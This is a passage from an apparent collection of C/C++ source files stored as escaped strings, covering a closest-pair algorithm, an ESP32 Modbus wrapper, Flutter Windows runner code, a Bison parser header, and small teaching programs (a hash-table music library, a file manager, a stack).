p2->y) ? (p1->y - p2->y) : (p1->x - p2->x);\n    if(dif == 0) return 0;  // El codigo de referencia utiliza puntos con coords enteras. Debemos modificar la comparacion para que retorne int\n    return (dif > 0)? 1 : -1;\n}\n\n\n// A Brute Force method to return the smallest distance between two points\n// in P[] of size n\nstatic pair<pair<int, int>, double> bruteForce(IndexedPoint *P, int n) {\n    double min = DBL_MAX;\n    pair<int, int> best_indices = {0, 0};\n    for (int i = 0; i < n; ++i){\n        for (int j = i+1; j < n; ++j){\n\t\t\tPoint p1 = {P[i].x, P[i].y};\n\t\t\tPoint p2 = {P[j].x, P[j].y};\n\t\t\tdouble d = dist(p1, p2);\n            if (d < min){\n                min = d;\n                best_indices = {P[i].index, P[j].index};\n            }\n\t\t}\n\t}\n\n    return {best_indices, min};\n}\n\n\n// A utility function to find the distance between the closest points of\n// strip of a given size. All points in strip[] are sorted according to\n// y coordinate. They all have an upper bound on minimum distance as d.\n// Note that this method seems to be a O(n^2) method, but it's a O(n)\n// method as the inner loop runs at most 6 times\nstatic pair<pair<int, int>, double> stripNearest(IndexedPoint *strip, int size, double d, pair<int, int> indices) {\n\tdouble min = d; // Initialize the minimum distance as d\n    pair<int, int> best_indices = indices;\n\t// Pick all points one by one and try the next points till the difference\n\t// between y coordinates is smaller than d.\n\t// This is a proven fact that this loop runs at most 6 times\n\tfor (int i = 0; i < size; ++i){\n\t\tfor (int j = i+1; j < size && (strip[j].y - strip[i].y) < min; ++j){\n\t\t\tPoint p1 = {strip[i].x, strip[i].y};\n\t\t\tPoint p2 = {strip[j].x, strip[j].y};\n\t\t\tdouble distance = dist(p1, p2);\n\t\t\tif (distance < min){\n\t\t\t\tmin = distance;\n                best_indices = {strip[i].index, strip[j].index};\n            }\n\t\t}\n\t}\n\n\treturn {best_indices, min};\n}\n\n// A recursive function to find the smallest distance. The array Px contains\n// all points sorted according to x coordinates and Py contains all points\n// sorted according to y coordinates\nstatic pair<pair<int, int>, double> nearestUtil(IndexedPoint *Px, IndexedPoint *Py, int n)\n{\n\t// If there are 2 or 3 points, then use brute force\n\tif (n <= 3)\n\t\treturn bruteForce(Px, n);\n\n\t// Find the middle point\n\tint mid = n/2;\n\tIndexedPoint midPoint = Px[mid];\n\n\n\t// Divide points in y sorted array around the vertical line.\n\t// Assumption: All x coordinates are distinct.\n\tIndexedPoint* Pyl = new IndexedPoint[mid];     // y sorted points on left of vertical line\n    IndexedPoint* Pyr = new IndexedPoint[n - mid]; // y sorted points on right of vertical line\n\n\tint li = 0, ri = 0; // indexes of left and right subarrays\n\tfor (int i = 0; i < n; i++) {\n        //std::cout << li << \" \" << ri << std::endl;\n        if ((Py[i].x < midPoint.x || (Py[i].x == midPoint.x && Py[i].y < midPoint.y)) && li < mid)\n            Pyl[li++] = Py[i];\n        else\n            Pyr[ri++] = Py[i];\n\t}\n\n\t// Consider the vertical line passing through the middle point\n\t// calculate the smallest distance dl on left of middle point and\n\t// dr on right side\n\tpair<pair<int, int>, double> dl = nearestUtil(Px, Pyl, mid);\n\tpair<pair<int, int>, double> dr = nearestUtil(Px + mid, Pyr, n-mid);\n    delete[] Pyl;\n    delete[] Pyr;\n\n\t// Find the smaller of two distances\n\n    pair <int, int> indices;\n\tdouble d;\n\n    if( dl.second < dr.second){\n        indices = dl.first;\n        d = dl.second;\n    }else{\n        indices = dr.first;\n        d = dr.second;\n    }\n\n\t// Build an array strip[] that contains points close",
    "//Copyright (c) 2024 Dominik M. Glogowski\n//\n//Permission is hereby granted, free of charge, to any person obtaining a copy\n//of this software and associated documentation files (the \"Software\"), to deal\n//in the Software without restriction, including without limitation the rights\n//to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n//copies of the Software, and to permit persons to whom the Software is\n//furnished to do so, subject to the following conditions:\n//\n//The above copyright notice and this permission notice shall be included in all\n//copies or substantial portions of the Software.\n//\n//THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n//SOFTWARE.\n\n#include \"SlaveDevice.h\"\n\nnamespace dynamic_modbus_master::slave {\n\nModbusError SlaveDevice::sendRequest(mb_param_request_t request, void *data) const{\n    uint8_t attempts = 0;\n    esp_err_t error;\n    do {\n        attempts++;\n        error = mbc_master_send_request(&request, data);\n        if (error != ESP_ERR_TIMEOUT) {\n            break;\n        }\n    } while(attempts <= m_retries);\n    if (attempts > m_retries) {\n        return ModbusError::TIMEOUT;\n    } else {\n        switch (error) {\n            case ESP_OK:\n                return ModbusError::OK;\n            case ESP_ERR_INVALID_ARG:\n                return ModbusError::INVALID_ARG;\n            case ESP_ERR_INVALID_RESPONSE:\n                return ModbusError::INVALID_RESPONSE;\n            case ESP_ERR_NOT_SUPPORTED:\n                return ModbusError::SLAVE_NOT_SUPPORTED;\n            default:\n                return ModbusError::FAILURE_OR_EXCEPTION;\n        }\n    }\n}\n\nSlaveDevice::SlaveDevice(uint8_t address, uint8_t retries): m_address(address), m_retries(retries) {\n}\n\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "/* A Bison parser, made by GNU Bison 3.5.1.  */\n\n/* Bison implementation for Yacc-like parsers in C\n\n   Copyright (C) 1984, 1989-1990, 2000-2015, 2018-2020 Free Software Foundation,\n   Inc.\n\n   This program is free software: you can redistribute it and/or modify\n   it under the terms of the GNU General Public License as published by\n   the Free Software Foundation, either version 3 of the License, or\n   (at your option) any later version.\n\n   This program is distributed in the hope that it will be useful,\n   but WITHOUT ANY WARRANTY; without even the implied warranty of\n   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n   GNU General Public License for more details.\n\n   You should have received a copy of the GNU General Public License\n   along with this program.  If not, see <http://www.gnu.org/licenses/>.  */\n\n/* As a special exception, you may create a larger work that contains\n   part or all of the Bison parser skeleton and distribute that work\n   under terms of your choice, so long as that work isn't itself a\n   parser generator using the skeleton or a modified version thereof\n   as a parser skeleton.  Alternatively, if you modify or redistribute\n   the parser skeleton itself, you may (at your option) remove this\n   special exception, which will cause the skeleton and the resulting\n   Bison output files to be licensed under the GNU General Public\n   License without this special exception.\n\n   This special exception was added by the Free Software Foundation in\n   version 2.2 of Bison.  */\n\n/* C LALR(1) parser skeleton written by Richard Stallman, by\n   simplifying the original so-called \"semantic\" parser.  */\n\n/* All symbols defined below should begin with yy or YY, to avoid\n   infringing on user name space.  This should be done even for local\n   variables, as they might otherwise be expanded by user macros.\n   There are some unavoidable exceptions within include files to\n   define necessary library symbols; they are noted \"INFRINGES ON\n   USER NAME SPACE\" below.  */\n\n/* Undocumented macros, especially those whose name start with YY_,\n   are private implementation details.  Do not rely on them.  */\n\n/* Identify Bison output.  */\n#define YYBISON 1\n\n/* Bison version.  */\n#define YYBISON_VERSION \"3.5.1\"\n\n/* Skeleton name.  */\n#define YYSKELETON_NAME \"yacc.c\"\n\n/* Pure parsers.  */\n#define YYPURE 2\n\n/* Push parsers.  */\n#define YYPUSH 0\n\n/* Pull parsers.  */\n#define YYPULL 1\n\n\n\n\n/* First part of user prologue.  */\n#line 1 \"/home/aaron/rucdeke/rucbase/src/parser/yacc.y\"\n\n#include \"ast.h\"\n#include \"yacc.tab.h\"\n#include <iostream>\n#include <memory>\n\nint yylex(YYSTYPE *yylval, YYLTYPE *yylloc);\n\nvoid yyerror(YYLTYPE *locp, const char* s) {\n    std::cerr << \"Parser Error at line \" << locp->first_line << \" column \" << locp->first_column << \": \" << s << std::endl;\n}\n\nusing namespace ast;\n\n#line 85 \"/home/aaron/rucdeke/rucbase/src/parser/yacc.tab.cpp\"\n\n# ifndef YY_CAST\n#  ifdef __cplusplus\n#   define YY_CAST(Type, Val) static_cast<Type> (Val)\n#   define YY_REINTERPRET_CAST(Type, Val) reinterpret_cast<Type> (Val)\n#  else\n#   define YY_CAST(Type, Val) ((Type) (Val))\n#   define YY_REINTERPRET_CAST(Type, Val) ((Type) (Val))\n#  endif\n# endif\n# ifndef YY_NULLPTR\n#  if defined __cplusplus\n#   if 201103L <= __cplusplus\n#    define YY_NULLPTR nullptr\n#   else\n#    define YY_NULLPTR 0\n#   endif\n#  else\n#   define YY_NULLPTR ((void*)0)\n#  endif\n# endif\n\n/* Enabling verbose error messages.  */\n#ifdef YYERROR_VERBOSE\n# undef YYERROR_VERBOSE\n# define YYERROR_VERBOSE 1\n#else\n# define YYERROR_VERBOSE 1\n#endif\n\n/* Use api.header.include to #include this header\n   instead of duplicating it here.  */\n#ifndef YY_YY_HOME_AARON_RUCDEKE_RUCBASE_SRC_PARSER_YACC_TAB_H_INCLUDED\n# define YY_YY_HOME_AARON_RUCDEKE_RUCBASE_SRC_PARSER_YACC_TAB_H_INCLUDED\n/* Debug traces.  */\n#ifndef YYDEBUG\n# define YYDEBUG 0\n#endif\n#if YYDEBUG\nextern int yydebug;\n#endif\n\n/* Token type.  */\n#ifndef YYTOKENTYPE\n# define YYTOKENTYPE\n  enum yytokentype\n  {\n    SHOW = 258,\n    TABLES = 259,\n    CREATE = 260,\n    TABLE = 261,\n    DROP = 262,\n    DESC = 263,\n    INSERT = 264,\n    INTO = 265,\n    VALUES = 266,\n    DELETE = 267,\n    FROM = 268,\n    WHERE = 269,\n    UPDATE = 270,\n    SET = 271,\n    SELECT = 272,\n    INT = 273,\n    CHAR = 274,\n    FLOAT = 275,\n    INDEX = 276,\n    AND = 277,\n    JOIN = 278,\n    EXIT = 279,\n    HELP = 280,\n    TXN_BEGIN = 281,\n    TXN_COMMIT = 282,\n    TXN_ABORT = 283,\n    TXN_ROLLBACK = 284,\n    LEQ = 285,\n    NEQ = 286,\n    GEQ = 287,\n    T_EOF = 288,\n    IDENTIFIER = 289,\n    VALUE_STRING = 290,\n    VALUE_INT = 291,\n    VALUE_FLOAT = 292\n  };\n#endif\n\n/* Value type.  */\n\n/* Location type.  */\n#if ! defined YYLTYPE && ! defined YYLTYPE_IS_DECLARED\ntypedef struct YYLTYPE YYLTYPE;\nstruct YYLTYPE\n{\n  int first_line;\n  int first_column;\n  int last_line;\n  int last_column;\n};\n# define YYLTYPE_IS_DECLARED 1\n# define YYLTYPE_IS_TRIVIAL 1\n#endif\n\n\n\nint yyparse (void);\n\n#endif /* !YY_YY_HOME_AARON_RUCDEKE_RUCBASE_SRC_PARSER_YACC_TAB_H",
    "#include <iostream>\r\n#include <string>\r\nusing namespace std;\r\n\r\n#define MAX 10\r\n\r\nclass Hash {\r\nprivate:\r\n    struct Song {\r\n        int song_id;\r\n        string song_name;\r\n        string singer;\r\n        string track;\r\n        string album;\r\n        Song* next;\r\n    };\r\n\r\n    Song* ht[MAX];\r\n\r\npublic:\r\n    Hash() {\r\n        for (int i = 0; i < MAX; i++)\r\n            ht[i] = nullptr;\r\n    }\r\n\r\n    void display();\r\n    void insert();\r\n    void search();\r\n    void deleter();\r\n};\r\n\r\nvoid Hash::display() {\r\n    cout << \"\\nMusic Library\" << endl;\r\n    cout << \"-----------------------------------------\" << endl;\r\n    cout << \"Index\\tSong ID\\tSinger\\tSong Name\\tTrack\\tAlbum\" << endl;\r\n    cout << \"-----------------------------------------\" << endl;\r\n\r\n    for (int i = 0; i < MAX; i++) {\r\n        Song* current = ht[i];\r\n        if (current == nullptr) {\r\n            cout << i << \"::\\tEmpty\" << endl;\r\n        } else {\r\n            cout << i << \"\\t\";\r\n            while (current != nullptr) {\r\n                cout << current->song_id << \"\\t\";\r\n                cout << current->singer << \"\\t\";\r\n                cout << current->song_name << \"\\t\";\r\n                cout << current->track << \"\\t\";\r\n                cout << current->album << endl;\r\n                if (current->next != nullptr)\r\n                    cout << \"\\t\\t\";\r\n                current = current->next;\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\nvoid Hash::insert() {\r\n    Song* newSong = new Song;\r\n    cout << \"Enter Song ID: \";\r\n    cin >> newSong->song_id;\r\n    cout << \"Enter Singer: \";\r\n    cin >> newSong->singer;\r\n    cout << \"Enter Song Name: \";\r\n    cin >> newSong->song_name;\r\n    cout << \"Enter Track: \";\r\n    cin >> newSong->track;\r\n    cout << \"Enter Album: \";\r\n    cin >> newSong->album;\r\n\r\n    int hashValue = newSong->song_id % MAX;\r\n    if (ht[hashValue] == nullptr) {\r\n        ht[hashValue] = newSong;\r\n    } else {\r\n        Song* current = ht[hashValue];\r\n        while (current->next != nullptr) {\r\n            current = current->next;\r\n        }\r\n        current->next = newSong;\r\n    }\r\n}\r\n\r\nvoid Hash::search() {\r\n    int id;\r\n    cout << \"Enter the Song ID to search: \";\r\n    cin >> id;\r\n\r\n    int hashValue = id % MAX;\r\n    Song* current = ht[hashValue];\r\n    while (current != nullptr) {\r\n        if (current->song_id == id) {\r\n            cout << \"Song Found:\" << endl;\r\n            cout << \"Song ID: \" << current->song_id << endl;\r\n            cout << \"Singer: \" << current->singer << endl;\r\n            cout << \"Song Name: \" << current->song_name << endl;\r\n            cout << \"Track: \" << current->track << endl;\r\n            cout << \"Album: \" << current->album << endl;\r\n            return;\r\n        }\r\n        current = current->next;\r\n    }\r\n    cout << \"Song not found.\" << endl;\r\n}\r\n\r\nvoid Hash::deleter() {\r\n    int id;\r\n    cout << \"Enter the Song ID to delete: \";\r\n    cin >> id;\r\n\r\n    int hashValue = id % MAX;\r\n    Song* current = ht[hashValue];\r\n    Song* prev = nullptr;\r\n\r\n    while (current != nullptr && current->song_id != id) {\r\n        prev = current;\r\n        current = current->next;\r\n    }\r\n\r\n    if (current == nullptr) {\r\n        cout << \"Song not found.\" << endl;\r\n        return;\r\n    }\r\n\r\n    if (prev == nullptr) {\r\n        ht[hashValue] = current->next;\r\n    } else {\r\n        prev->next = current->next;\r\n    }\r\n    delete current;\r\n    cout << \"Song deleted successfully.\" << endl;\r\n}\r\n\r\nint main() {\r\n    Hash musicLibrary;\r\n\r\n    int choice;\r\n    while (true) {\r\n        cout << \"\\n---------------------------------\" << endl;\r\n        cout << \"Music Library Management System\" << endl;\r\n        cout << \"---------------------------------\" << endl;\r\n        cout << \"1. Insert Song\" << endl;\r\n        cout << \"2. Search Song\" << endl;\r\n        cout << \"3. Delete Song\" << endl;\r\n        cout << \"4. Display Library\" << endl;\r\n        cout << \"5. Exit\" << endl;\r\n        cout << \"Enter your choice: \";\r\n        cin >> choice;\r\n\r\n        switch (choice) {\r\n            case 1:\r\n                musicLibrary.insert();\r\n                break;\r\n            case 2:\r\n                musicLibrary.search();\r\n                break;\r\n            case 3:\r\n                musicLibrary.deleter();\r\n                break;\r\n            case 4:\r\n                musicLibrary.display();\r\n                break;\r\n            case 5:\r\n                cout << \"Exiting the program.\" << endl;\r\n                return 0;\r\n            default:\r\n                cout << \"Invalid choice. Please enter a valid option.\" << endl;\r\n        }\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\n#include <filesystem>\n#include <string>\n\nnamespace fs = std::filesystem;\n\nvoid listDirectory(const std::string& path) {\n    for (const auto& entry : fs::directory_iterator(path)) {\n        std::cout << entry.path().filename() << std::endl;\n    }\n}\n\nvoid createDirectory(const std::string& path) {\n    if (!fs::exists(path)) {\n        if (fs::create_directory(path)) {\n            std::cout << \"Directory created successfully.\\n\";\n        } else {\n            std::cerr << \"Error: Failed to create directory.\\n\";\n        }\n    } else {\n        std::cerr << \"Error: Directory already exists.\\n\";\n    }\n}\n\nvoid deleteFileOrDirectory(const std::string& path) {\n    if (fs::exists(path)) {\n        if (fs::is_directory(path)) {\n            if (fs::remove_all(path)) {\n                std::cout << \"Directory deleted successfully.\\n\";\n            } else {\n                std::cerr << \"Error: Failed to delete directory.\\n\";\n            }\n        } else {\n            if (fs::remove(path)) {\n                std::cout << \"File deleted successfully.\\n\";\n            } else {\n                std::cerr << \"Error: Failed to delete file.\\n\";\n            }\n        }\n    } else {\n        std::cerr << \"Error: File or directory does not exist.\\n\";\n    }\n}\n\nint main() {\n    std::string path;\n    char choice;\n\n    std::cout << \"Welcome to Simple File Manager\\n\";\n    std::cout << \"Enter directory path: \";\n    std::cin >> path;\n\n    do {\n        std::cout << \"\\nOptions:\\n\";\n        std::cout << \"1. List files and folders\\n\";\n        std::cout << \"2. Create directory\\n\";\n        std::cout << \"3. Delete file or directory\\n\";\n        std::cout << \"4. Exit\\n\";\n        std::cout << \"Enter your choice: \";\n        std::cin >> choice;\n\n        switch (choice) {\n            case '1':\n                listDirectory(path);\n                break;\n            case '2':\n                std::cout << \"Enter directory name to create: \";\n                std::cin >> path;\n                createDirectory(path);\n                break;\n            case '3':\n                std::cout << \"Enter file or directory name to delete: \";\n                std::cin >> path;\n                deleteFileOrDirectory(path);\n                break;\n            case '4':\n                std::cout << \"Exiting program.\\n\";\n                break;\n            default:\n                std::cerr << \"Error: Invalid choice.\\n\";\n        }\n    } while (choice != '4');\n\n    return 0;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\nusing namespace std;\nstruct node\n{\n\tint Data;\n\tnode* next;\n};\n\n// global pointer\nnode* TOP = NULL;\nnode* current = NULL;\n\nbool isEmpty()\n{\n\tif (TOP == NULL)\n\t\treturn true;\n\telse\n\t\treturn false;\n}\nvoid push(int newdata)\n{\n\tnode* current = new node();\n\tcurrent->Data = newdata;\n\tif (!isEmpty())\n\t{\n\t\tcurrent->next = TOP;\n\t\tTOP = current;\n\t}\n\telse\n\t{\n\t\tTOP = current;\n\t\tTOP->next = NULL;\n\t}\n}\nvoid pop()\n{\n\tif (!isEmpty())\n\t{\n\t\tcurrent = TOP;\n\t\tTOP = TOP->next;\n\t\tdelete current;\n\t}\n\telse\n\t\tcout << \"No stack found\" << endl;\n}\nvoid popAll()\n{\n\twhile (!isEmpty())\n\t{\n\t\tcurrent = TOP;\n\t\tTOP = TOP->next;\n\t\tdelete current;\n\t}\n}\nvoid display()\n{\n\tif (!isEmpty())\n\t{\n\t\tcurrent = TOP;\n\t\twhile (current != NULL)\n\t\t{\n\t\t\tcout << current->Data << endl;\n\t\t\tcurrent = current->next;\n\t\t}\n\t}\n\telse cout << \"There is no data in the Stack\\n\";\n}\nvoid app()\n{\n\t/*\n\t\top -> operation\n\t\tc -> confirm\n\t\tp -> push node\n\t\tao -> another operation\n\t\ts -> starter app\n\t*/\n\t\tint op, c, p, ao, s;\n\tcout << \"--- Welcome to stack implementation---\\n\";\n\tdo\n\t{\n\t\tcout << \"Choise what do you want\\n\";\n\t\tcout << \"Push -> (1)\\n\";\n\t\tcout << \"Pop an Elements -> (2) \\n\";\n\t\tcout << \"POP All Elements -> (3)\\n\";\n\t\tcout << \"Display -> (4)\\n\";\n\t\tcout << \"Exit -> (5)\\n\";\n\t\tcin >> op;\n\t\tswitch (op)\n\t\t{\n\t\tcase 1:\n\t\t\tcout << \"Enter value do you want to push \\n\";\n\t\t\tcin >> p;\n\t\t\tpush(p);\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\tcout << \"Are you sure to pop one node\\n\";\n\t\t\tcout << \"To Confirm Enter -> (1)\\n\";\n\t\t\tcout << \"To Cancel Enter -> any key\\n\";\n\t\t\tcin >> c;\n\t\t\tif (c == 1)\n\t\t\t{\n\t\t\t\tpop();\n\t\t\t\tcout << \"\\nCheck data of stack after poping first node : \\n \";\n\t\t\t\tdisplay();\n\t\t\t}\n\t\t\telse {\n\t\t\t\tcout << \"Pop is canceled\\n\";\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 3:\n\t\t\tcout << \"Are you sure to pop all nodes\\n\";\n\t\t\tcout << \"To Confirm Enter -> (1)\\n\";\n\t\t\tcout << \"To Cancel Enter -> any key\\n\";\n\t\t\tcin >> c;\n\t\t\tif (c == 1)\n\t\t\t{\n\t\t\t\tpopAll ();\n\t\t\t\tcout << \"\\nCheck data of stack after poping all nodes : \\n \";\n\t\t\t\tdisplay();\n\t\t\t}\n\t\t\telse {\n\t\t\t\tcout << \"Pop all is canceled\\n\";\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 4:\n\t\t\tcout << \"Pushed Elements are:\\n\";\n\t\t\tdisplay();\n\t\t\tbreak;\n\t\tcase 5:\n\t\t\treturn;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tcout << \"Wrong Input Try Again\\n\";\n\t\t}\n\t\tcout << \"Do you want another opration\\n\";\n\t\tcout << \"Yes -> 1 \\n\";\n\t\tcout << \"NO -> any key \\n\";\n\t\tcin >> ao;\n\t} while (ao == 1);\n}\nint main()\n{\n\tapp();\n\treturn 0;\n}",
